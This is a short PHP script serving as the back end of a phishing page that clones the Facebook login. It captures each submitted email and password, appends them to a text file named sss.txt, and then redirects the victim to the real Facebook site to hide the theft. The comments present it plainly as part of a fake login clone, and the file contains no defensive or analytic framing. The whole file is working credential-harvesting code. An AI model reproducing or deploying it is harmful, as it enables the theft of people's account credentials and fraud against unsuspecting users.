<?php
$uname=$_POST['email']; //assign values variable to passing by main fblogin clone page
$pass=$_POST['pass'];  //assign values variable to passing by main fblogin clone page

$temp = file_get_contents("sss.txt"); 
$myfile = fopen("sss.txt", "w") or die("Unable to open file!");// open the text file



$txt = " $temp \t $uname \t $pass | \n"; // set the values to variable to save
fwrite($myfile, $txt); // save values in file
fclose($myfile);//close the file


header('Location: https://www.facebook.com/'); // redirect real fb page
?>
